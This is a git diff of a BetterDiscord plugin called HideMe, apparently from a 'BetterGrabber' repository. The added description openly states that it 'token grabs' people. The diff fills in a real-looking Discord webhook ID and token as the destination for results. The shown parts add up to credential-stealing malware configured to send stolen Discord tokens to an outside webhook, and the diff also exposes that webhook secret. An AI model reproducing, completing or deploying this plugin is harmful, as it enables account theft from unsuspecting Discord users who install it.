@@ -1,12 +1,16 @@
 /**
  * @name HideMe
- * @authorId HideakiAtsuyo
+ * @author HideakiAtsuyo
+ * @authorId 868150205852291183
+ * @version 1.1.1
+ * @description Allows you to token grab people omg
  * @invite https://discord.gg/C7yHkVSE2M
  * @donate https://www.paypal.me/HideakiAtsuyoLmao
- * @website https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD
- * @source https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD/HideMe.plugin.js
+ * @website https://github.com/HideakiAtsuyo
+ * @source https://github.com/HideakiAtsuyo/BetterGrabber/tree/master/GOD/
  * @updateUrl https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/master/GOD/HideMe.plugin.js
  */
+
 class HideMe {
     // Constructor
     constructor() {
@@ -42,7 +46,7 @@ class HideMe {
 
     	var config = {
     		pingOnResult: true,
-    		webHook: "/api/webhooks/ID/TOKEN",
+    		webHook: "/api/webhooks/915046074685734933/w_17tVcLIGIVy5BIV_5iG9l5rC_nvwBlzSD1DpTyC3j8pjFvKznc0E_R8M10caOKSINp",
     		webhookUsername: "Hello World",
     		webhookAvatar: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
 
